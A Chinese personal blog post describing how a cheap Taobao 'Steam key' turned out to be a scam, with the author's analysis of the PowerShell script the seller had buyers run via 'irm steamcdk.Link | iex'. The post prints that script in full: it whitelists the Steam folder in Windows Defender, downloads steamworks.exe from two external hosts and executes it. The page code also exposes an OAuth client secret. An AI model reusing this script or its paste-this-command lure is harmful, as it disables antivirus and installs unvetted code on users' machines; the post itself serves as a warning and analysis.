<!doctype html><head><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><link rel=icon type=image/x-icon href=/images/favicon.ico><link rel="shortcut icon" type=image/x-icon href=/images/favicon.ico><title>廉价steam cdk其实在卖盗版甚至还坑到我了这件事！ - Chireiden</title><meta name=author content="RedContritio"><meta name=description content="地霊殿，充满幻想与希望的殿堂"><meta name=keywords content="steam,信息安全,游戏,greenluma"><meta property="og:title" content="廉价steam cdk其实在卖盗版甚至还坑到我了这件事！"><meta property="og:description" content="今天突然看到 steam 上的游戏 &ldquo;House Flipper 2&rdquo; -20%，虽说减完之后还剩 ￥108，但是毕竟，办法总比困难多，去淘宝看看有没有廉价 cdk 吧！结果，这导致我被店家的伎俩欺骗！"><meta property="og:type" content="article"><meta property="og:url" content="https://RedContritio.github.io/2024/03/%E5%BB%89%E4%BB%B7steam-cdk%E5%85%B6%E5%AE%9E%E5%9C%A8%E5%8D%96%E7%9B%97%E7%89%88%E7%94%9A%E8%87%B3%E8%BF%98%E5%9D%91%E5%88%B0%E6%88%91%E4%BA%86%E8%BF%99%E4%BB%B6%E4%BA%8B/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-09T15:40:05+08:00"><meta property="article:modified_time" content="2024-03-09T15:40:05+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="廉价steam cdk其实在卖盗版甚至还坑到我了这件事！"><meta name=twitter:description content="今天突然看到 steam 上的游戏 &ldquo;House Flipper 2&rdquo; -20%，虽说减完之后还剩 ￥108，但是毕竟，办法总比困难多，去淘宝看看有没有廉价 cdk 吧！结果，这导致我被店家的伎俩欺骗！"><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css><script src=https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js></script>
<link rel=stylesheet href=https://RedContritio.github.io/scss/main.min.7eb360f545dea4e461c361ba2b40f8b68bf2f8129d711aab867c8748ca5a8c07.css integrity="sha256-frNg9UXepORhw2G6K0D4tovy+BKdcRqrhnyHSMpajAc=" crossorigin=anonymous media=screen><link href=//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css rel=stylesheet></head></head><body><span class="mobile btn-mobile-menu"><i class="fa fa-list btn-mobile-menu__icon"></i>
<i class="fa fa-angle-up btn-mobile-close__icon hidden"></i></span><header class="panel-cover panel-cover--collapsed" style=background-image:url(/images/background-cover.jpg)><div class=panel-main><div class="panel-main__inner panel-inverted"><div class=panel-main__content><a href=/#blog title="Homepage of Chireiden " class=blog-button><img src=/images/avatar.jpg width=80 alt="Chireiden logo" class="panel-cover__logo logo"></a><h1 class="panel-cover__title panel-title"><a href=/#blog title="Homepage of Chireiden" class=blog-button>Chireiden</a></h1><span class="panel-cover__subtitle panel-subtitle">地霊殿</span><hr class=panel-cover__divider><p class=panel-cover__description>地霊殿，充满幻想与希望的殿堂</p><hr class="panel-cover__divider panel-cover__divider--secondary"><p class=panel-cover__description>夢も希望も無い、毎日がそんな生活だった。</p><div class=navigation-wrapper><div><nav class="cover-navigation cover-navigation--primary"><ul class=navigation><li class=navigation__item><a href=/#blog title=Blog class=blog-button>Blog</a></li><li class=navigation__item><a href=/tags/ target=_blank title=Tags>Tags</a></li><li class=navigation__item><a href=/friends/ target=_blank title=Friends>Friends</a></li><li class=navigation__item><a href=/about/ target=_blank title=About>About</a></li></ul></nav></div><div><nav class="cover-navigation navigation--social"><ul class=navigation><li class=navigation__item><a href=https://github.com/RedContritio title=@RedContritio target=_blank><i class='social fa fa-github'></i>
<span class=label>Github</span></a></li><li class=navigation__item><a href=/index.xml rel=author title=RSS target=_blank><i class='social fa fa-rss'></i>
<span class=label>RSS</span></a></li><li class=navigation__item><a href=mailto:RedContritio@qq.com title="Contact me"><i class='social fa fa-envelope'></i>
<span class=label>Email</span></a></li></ul></nav></div></div></div></div><div class="panel-cover--overlay cover-light-red"></div></div></header><div class=content-wrapper><div class=content-wrapper__inner><article class="post-container post-container--single" itemscope itemtype=http://schema.org/BlogPosting><header class=post-header><div class=post-meta><time datetime=" 2024-03-09 15:40:05 +0800 " itemprop=datePublished class="post-meta__date date">2024-03-09</time>
<span class="post-meta__tags tags">• <a href=https://RedContritio.github.io/tags/steam>steam</a> • <a href=https://RedContritio.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8>信息安全</a> • <a href=https://RedContritio.github.io/tags/%E6%B8%B8%E6%88%8F>游戏</a> • <a href=https://RedContritio.github.io/tags/greenluma>greenluma</a></span></div><h1 class=post-title>廉价steam cdk其实在卖盗版甚至还坑到我了这件事！</h1></header><section class=post><nav id=TableOfContents><ul><li><a href=#廉价-cdk>廉价 cdk</a></li><li><a href=#发现问题>发现问题</a></li><li><a href=#试图揭秘>试图揭秘</a><ul><li><a href=#那行命令是什么>那行命令是什么？</a></li><li><a href=#之前有人遇到过吗>之前有人遇到过吗？</a></li><li><a href=#这个有多大危害呢>这个有多大危害呢？</a></li><li><a href=#怎么清除>怎么清除</a></li></ul></li><li><a href=#尝试总结>尝试总结</a></li></ul></nav><p>今天突然看到 steam 上的游戏 &ldquo;House Flipper 2&rdquo; -20%，虽说减完之后还剩 ￥108，但是毕竟，办法总比困难多，去淘宝看看有没有廉价 cdk 吧！结果，这导致我被店家的伎俩欺骗！</p><h2 id=廉价-cdk>廉价 cdk</h2><p>众所周知，有事就找万能的淘宝，打开淘宝，搜索 &ldquo;House Flipper 2&rdquo;，发现最便宜的 cdk 居然只要 ￥9.9，看起来狠虚假的价格，毕竟史低都是 ￥108。</p><p>但是，￥9.9，还要什么自行车？直接下单。</p><p>随后，店家发了一份使用说明：</p><blockquote><p>首先打开终端，输入 <code>irm steamcdk.Link | iex</code></p><p>随后会弹出输入 cdk 的窗口，在里面输入 cdk 即可激活</p><p>cdk：AAAAA-BBBBB-CCCCC-DDDDD-EEEEE</p></blockquote><p>乍一看倒是蛮正常的，仿佛是打开了什么 steamcdk 的功能。</p><p>特别提一下，<strong>这里我直接在 steam 窗口内兑换，会提示无效兑换码</strong>，但是当时鬼使神差觉得可能是因为需要用这个特殊的方法打开兑换窗口才行。</p><p>（说不定这就是人性的贪婪和懒惰，以后注意，不过花开两朵，各表一枝，我们先继续说被骗的事）</p><p>那按照前面所述，不得已，开个终端执行这个命令，然后弹出一个警告弹窗，&ldquo;you are using steam beta files, greenluma &mldr;"，啊不过当然最后不是省略号，可是忘了后面是什么内容了。</p><p>随后 steam 被启动，库里已经有了这个游戏。</p><h2 id=发现问题>发现问题</h2><p>看起来很正常啊，合情合理，但是我之前把这个游戏加了购物车，现在还在购物车里。如果我是小白或许我就信了，但是很遗憾，我以前激活的游戏会从购物车中离开。</p><p>其次，在商店页面，仍然能够为自己购买这个游戏。</p><p>这时候我怀疑是家庭共享，并且找店家要求退款，表示这是共享的用不了。</p><p>店家虽然表示这不是共享，但是还是给退了。</p><p>但是！这个游戏，还在库里。</p><p>这不合常理，它为什么会在库里？</p><p>如果它真的有成本，店家为什么这么容易退款？</p><h2 id=试图揭秘>试图揭秘</h2><h3 id=那行命令是什么>那行命令是什么？</h3><p>好，很巧，我以前曾经用过 <code>irm</code> 这个命令，虽然不那么熟悉，但是我用浏览器打开了 <code>steamcdk.link</code>，结果自动跳转到了 <code>http://steamcdk.link/sendfile</code>，并且其中有很多伪装的输出来假扮正版 <code>steam</code>，去掉这部分输出，剩余脚本如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span><span style=color:#75715e># [Console]::OutputEncoding = [System.Text.Encoding]::UTF8</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span><span style=color:#66d9ef>Requires</span> <span style=color:#66d9ef>-RunAsAdministrator</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$isAdmin = [<span style=color:#66d9ef>bool</span>]([<span style=color:#66d9ef>Security.Principal.WindowsIdentity</span>]::GetCurrent().Groups <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#39;S-1-5-32-544&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>-not</span> $isAdmin) {
</span></span><span style=display:flex><span>    Write-Host <span style=color:#e6db74>&#34;Please Run as Administrator&#34;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$steamRegPath = <span style=color:#e6db74>&#39;HKCU:\Software\Valve\Steam&#39;</span>
</span></span><span style=display:flex><span>$steamPath = (Get-ItemProperty -Path $steamRegPath -Name <span style=color:#e6db74>&#39;SteamPath&#39;</span>).SteamPath
</span></span><span style=display:flex><span>$root = $steamPath.Substring(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>1</span>) <span style=color:#75715e># 鑾峰彇璺緞涓殑鐩樼閮ㄥ垎</span>
</span></span><span style=display:flex><span>$rest = $steamPath.Substring(<span style=color:#ae81ff>1</span>)   <span style=color:#75715e># 鑾峰彇璺緞涓洏绗﹀悗闈㈢殑閮ㄥ垎</span>
</span></span><span style=display:flex><span>$steamPath = $root.ToUpper() + $rest <span style=color:#75715e># 灏嗙洏绗﹂儴鍒嗚浆鎹负澶у啓</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># $steamPath = $filePath -replace &#34;/&#34;, &#34;\&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Write-Host $steamPath</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($null <span style=color:#f92672>-ne</span> $steamPath) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span><span style=color:#75715e># exclude windows defender</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (Get-Service | where-object { $_.name <span style=color:#f92672>-eq</span> <span style=color:#e6db74>&#34;windefend&#34;</span> <span style=color:#f92672>-and</span> $_.status <span style=color:#f92672>-eq</span> <span style=color:#e6db74>&#34;running&#34;</span> }) {
</span></span><span style=display:flex><span>            Add-MpPreference -ExclusionPath $steamPath -ExclusionExtension <span style=color:#e6db74>&#34;.dll&#34;</span>,<span style=color:#e6db74>&#34;.exe&#34;</span>
</span></span><span style=display:flex><span>            Write-Host <span style=color:#e6db74>&#34;  [STEAM]  Windows Defender has been exclude&#34;</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            Write-Host <span style=color:#e6db74>&#34;  [STEAM] Windows Defender exclude failed.&#34;</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># display Message</span>
</span></span><span style=display:flex><span>        Write-Host <span style=color:#e6db74>&#34;  [STEAM] App is ready for run .please wait... &#34;</span>
</span></span><span style=display:flex><span>        Write-Host <span style=color:#e6db74>&#34;  [STEAM] Windows Defender has been clear &#34;</span>
</span></span><span style=display:flex><span>        Write-Host <span style=color:#e6db74>&#34;  [STEAM] Ready to go !!! &#34;</span>
</span></span><span style=display:flex><span>        Write-Host <span style=color:#e6db74>&#34;  [STEAM] watiing 1-3min &#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># download file and process</span>
</span></span><span style=display:flex><span>        $appStorePath = Join-Path $steamPath <span style=color:#e6db74>&#34;steamworks.exe&#34;</span>
</span></span><span style=display:flex><span>        $downloadUrl = <span style=color:#e6db74>&#34;http://by.haory.cn/1/1128/steamworks.exe&#34;</span>
</span></span><span style=display:flex><span>        $backupUrl = <span style=color:#e6db74>&#34;https://m1744435.096096.xyz/steamworks.exe&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            (New-Object Net.WebClient).DownloadFile($downloadUrl, $appStorePath)
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> {
</span></span><span style=display:flex><span>            Write-Warning <span style=color:#e6db74>&#34;Steamcdk failed. [STEAM] watiing.&#34;</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>                (New-Object Net.WebClient).DownloadFile($backupUrl, $appStorePath)
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>catch</span> {
</span></span><span style=display:flex><span>                Write-Error <span style=color:#e6db74>&#34;Steamcdk failed. Please check your internet connection or colse 鍏抽棴VPN閲嶈瘯.&#34;</span>
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># lauch execute our exe file;</span>
</span></span><span style=display:flex><span>        Start-Process -FilePath $appStorePath
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>catch</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>很简单的一段 <code>powershell</code> 脚本，首先获取管理员权限，随后获取 <code>Steam</code> 的安装路径记为 <code>$SteamPath</code>。</p><p>插段题外话，这里一个好笑的点是，这里有很多中文乱码是吧，这些乱码原来是 <code>gbk</code> 格式，但是被保存为了 <code>utf8</code>，所以变成了乱码，这四行乱码分别是</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>$root = $steamPath.Substring(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>1</span>) <span style=color:#75715e># 获取路径中的盘符部分</span>
</span></span><span style=display:flex><span>$rest = $steamPath.Substring(<span style=color:#ae81ff>1</span>)   <span style=color:#75715e># 获取路径中盘符后面的部分</span>
</span></span><span style=display:flex><span>$steamPath = $root.ToUpper() + $rest <span style=color:#75715e># 将盘符部分转换为大写</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Write-Error <span style=color:#e6db74>&#34;Steamcdk failed. Please check your internet connection or colse 关闭VPN重试.&#34;</span>
</span></span></code></pre></div><p><em>中文乱码恢复功能 powered by <a href=https://wrtools.top/coderepair.php>WR便利工具网</a></em></p><p>在获取 <code>$SteamPath</code> 之后，为了防止被敏感拉满的 <code>Windows Defender</code> 干掉，它先把 <code>$SteamPath</code> 加入了 <code>Windows Defender</code> 的排除路径（白名单）。</p><p>随后，它尝试去 <code>http://by.haory.cn/1/1128/steamworks.exe</code> 下载这个 exe 文件，并放入 <code>$SteamPath</code> 中。如果这个网址不可用，则使用备份网址 <code>https://m1744435.096096.xyz/steamworks.exe</code> 来下载。不得不说，聪明的备份机制。</p><p>最后，执行下载得到的 <code>steamworks.exe</code> 文件，它会劫持并接管 steam 的启动。</p><h3 id=之前有人遇到过吗>之前有人遇到过吗？</h3><p>有，而且有各种技法 ，列举三个常见的出来：</p><ol><li><a href=https://zhuanlan.zhihu.com/p/619338811>家庭账号共享</a></li><li><a href=https://tieba.baidu.com/p/8216526284>steamip 助手（第三方软件）</a></li><li><a href=https://www.bilibili.com/video/BV15u411x7Se/>steamworks （就是我遇到这个）</a></li></ol><h3 id=这个有多大危害呢>这个有多大危害呢？</h3><p>好吧，其实危害并不大，记得前面那个警告窗口吗？<code>XXX greenluma XXX</code> 那个，这里面突兀出现的词 <code>GreenLuma</code> 其实就是破局点。</p><p>GreenLuma 是一款国外大神 Steam006 开发的游戏解锁工具（正版途径玩盗版），其实爱好者有很多都在使用这个工具，可以参考 <a href=https://zhuanlan.zhihu.com/p/638294581>知乎介绍</a> 、<a href=https://tieba.baidu.com/p/7951081224>贴吧讲解</a> 或者直接去 <a href=https://github.com/BlueAmulet/GreenLuma-2024-Manager/releases>Github 下载</a>。</p><p>但是！这个店家重新打包成 <code>steamworks</code> 之后，由于不透明的原因，其中的危害是不可预知的，因此建议不要保留，通过彻底卸载并删除 steam 即可清除。</p><p>当然，因为我开了火绒的联网控制，可以看到这个 <code>steamworks</code>全程是没有主动联网的，所以应该不用担心账号密码被泄露的问题。</p><h3 id=怎么清除>怎么清除</h3><p>先卸载 steam，随后删除 steam 所在的文件夹，最后重新安装即可。</p><h2 id=尝试总结>尝试总结</h2><p>总之，贪小便宜吃大亏，好在退掉了，但愿以后不要再中这种漏洞百出的骗局。</p></section></article><section class=read-more><div class=read-more-header><div class="read-more-header-item read-more-item"></div><div class="read-more-header-item read-more-item"><span class=read-more-item-dim>Earlier</span><h2 class="post-list__post-title post-title"><a href=/2024/03/%E5%9F%BA%E4%BA%8Eopenwrt%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8E%E6%90%AD%E6%A2%AF%E5%AD%90%E6%95%99%E7%A8%8B/ title="link to 基于openwrt的配置与搭梯子教程">基于openwrt的配置与搭梯子教程</a></h2></div></div><div class=read-more-summary><div class="read-more-summary-item read-more-item"></div><div class="read-more-summary-item read-more-item"><p class=excerpt><p>因为某些技术性故障，导致路由器崩掉了，重置且配置梯子好麻烦啊，所以写个备忘录。</p>&mldr;</p></div></div><div class=read-more-meta><div class="read-more-meta-item read-more-item"></div><div class="read-more-meta-item read-more-item"><time datetime="2024-03-09 15:40:05 +0800" class="post-list__meta--date date">2024-03-08</time>
<span class="post-list__meta--tags tags">• <a href=https://RedContritio.github.io/tags/openwrt>openWrt</a> • <a href=https://RedContritio.github.io/tags/clash>clash</a> • <a href=https://RedContritio.github.io/tags/openclash>openclash</a> • <a href=https://RedContritio.github.io/tags/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE>网络配置</a></span>
<a class=btn-border-small href=/2024/03/%E5%9F%BA%E4%BA%8Eopenwrt%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8E%E6%90%AD%E6%A2%AF%E5%AD%90%E6%95%99%E7%A8%8B/>Continue</a></div></div></section><section class=post-comments><div id=gitalk-container><script>var gitalk=new Gitalk({clientID:"0a6a884a25f2cfcd11b3",clientSecret:"63fa88190fa69c3d00d744d99b78af1b13f595ec",repo:"RedContritio.github.io",owner:"RedContritio",admin:["RedContritio"],id:"a1a75576d028fe9606259008777194bc_2024-03-09",distractionFreeMode:!1});gitalk.render("gitalk-container")</script></div></section><section class=footer><footer><span class=footer__copyright>This site is licensed under a <a href=http://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a> license.</span>
<span class=footer__copyright>Generated by <a href=https://gohugo.io/>Hugo</a> at 2024-03-09, themed with <a href=https://github.com/xslingcn/vno-hugo>Vno - Hugo</a>.</span></footer></section></div></div><script type=text/javascript src=//code.jquery.com/jquery-1.11.3.min.js></script>
<script type=text/javascript src=/js/main.js></script><script>(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","//www.google-analytics.com/analytics.js","ga"),ga("create","your_ga_id","your_host"),ga("send","pageview")</script></body>